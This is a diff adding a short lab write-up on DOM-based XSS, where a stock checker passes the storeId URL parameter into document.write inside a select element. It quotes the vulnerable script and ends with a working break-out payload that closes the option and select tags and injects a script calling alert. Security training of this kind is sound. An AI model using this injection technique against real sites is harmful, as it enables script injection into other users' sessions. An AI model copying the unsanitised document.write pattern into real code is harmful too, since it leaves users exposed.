@@ -1,0 +1,32 @@
+Lab #4 - DOM XSS in document.write sink using source location.search inside a select element
+
+Vulnerability - This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search which you can control using the website URL. The data is enclosed within a select element.
+
+Goal - To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the alert function.
+
+Analysis:
+1. The response from GET /product?productId=1 HTTP/2 contains a Javascript code block:
+<script>
+    var stores = ["London","Paris","Milan"];
+    var store = (new URLSearchParams(window.location.search)).get('storeId');
+    document.write('<select name="storeId">');
+    if(store) {
+        document.write('<option selected>'+store+'</option>');
+    }
+    for(var i=0;i<stores.length;i++) {
+        if(stores[i] === store) {
+            continue;
+        }
+        document.write('<option>'+stores[i]+'</option>');
+    }
+    document.write('</select>');
+</script>
+=> It can be a sink
+
+2. See that, when we add a parameter storeId in the URL query scripting
+=> It will be displayed as a option
+=> It is vulnerable to XSS attack
+
+3. Change the storeId to display alert
+GET /product?productId=1&storeId=</option></select><script>alert(1)</script> HTTP/2
+=> SUCCESSFULLY
